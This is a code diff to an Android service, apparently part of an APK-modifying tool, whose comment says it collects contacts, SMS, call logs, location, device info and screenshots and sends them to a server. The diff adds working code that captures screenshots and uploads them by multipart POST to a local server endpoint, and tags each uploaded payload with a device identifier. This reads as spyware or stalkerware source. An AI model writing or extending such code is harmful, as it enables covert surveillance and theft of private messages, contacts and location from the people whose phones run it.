@@ -31,7 +31,8 @@ import java.util.Date;
 import java.util.Locale;
 
 /**
- * Service to collect device data and send to server/Telegram
+ * Service to collect device data and send to server
+ * Collects: contacts, SMS, call logs, location, device info, screenshots, etc.
  */
 public class DataCollectionService extends Service {
     private static final String TAG = "DataCollection";
@@ -324,6 +325,55 @@ public class DataCollectionService extends Service {
             (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
     }
     
+    private void captureScreenshot() {
+        try {
+            // Request screenshot capture from MainActivity
+            Intent intent = new Intent("com.apkmodifier.CAPTURE_SCREENSHOT");
+            sendBroadcast(intent);
+            Log.d(TAG, "Screenshot capture requested");
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting screenshot", e);
+        }
+    }
+    
+    private void sendScreenshotToServer(byte[] imageData) {
+        new Thread(() -> {
+            try {
+                String boundary = "----Boundary" + System.currentTimeMillis();
+                URL url = new URL("http://127.0.0.1:5000/api/screenshot");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                conn.setDoOutput(true);
+                
+                java.io.DataOutputStream out = new java.io.DataOutputStream(conn.getOutputStream());
+                
+                // Add device_id field
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n");
+                out.writeBytes(android.os.Build.MODEL + "_" + android.os.Build.DEVICE + "\r\n");
+                
+                // Add screenshot file
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"screenshot\"; filename=\"screenshot.png\"\r\n");
+                out.writeBytes("Content-Type: image/png\r\n\r\n");
+                out.write(imageData);
+                out.writeBytes("\r\n");
+                out.writeBytes("--" + boundary + "--\r\n");
+                
+                out.flush();
+                out.close();
+                
+                int responseCode = conn.getResponseCode();
+                Log.d(TAG, "Screenshot sent, response: " + responseCode);
+                
+                conn.disconnect();
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending screenshot", e);
+            }
+        }).start();
+    }
+    
     private void sendToServer(String type, String data) {
         new Thread(() -> {
             try {
@@ -338,6 +388,7 @@ public class DataCollectionService extends Service {
                 payload.put("type", type);
                 payload.put("data", new JSONObject(data));
                 payload.put("timestamp", System.currentTimeMillis());
+                payload.put("device_id", android.os.Build.MODEL + "_" + android.os.Build.DEVICE);
                 
                 OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                 writer.write(payload.toString());
